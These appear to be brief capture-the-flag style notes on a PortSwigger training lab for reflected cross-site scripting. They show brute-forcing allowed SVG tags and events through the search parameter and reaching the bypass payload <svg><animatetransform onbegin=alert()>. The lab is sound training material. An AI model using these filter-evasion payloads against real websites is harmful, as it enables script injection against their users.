# Lab: Reflected XSS with some SVG markup allowed
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

```bash
<img src=0 onerror=alert()>
"Tag is not allowed"
```
```bash
# Brute force check my previous XSS Labs for how to brute force.
GET /?search=<§§> HTTP/1.1

animatetransform
svg
image

# We can use animetransform which works inside svg.
```
```bash
<svg><animatetransform onerror=alert()>

"Event is not allowed"

```
```bash
# Brute Force
GET /?search=<svg><animatetransform%20§§=0> HTTP/1.1

onbegin
```
```bash
<svg><animatetransform onbegin=alert()>
```
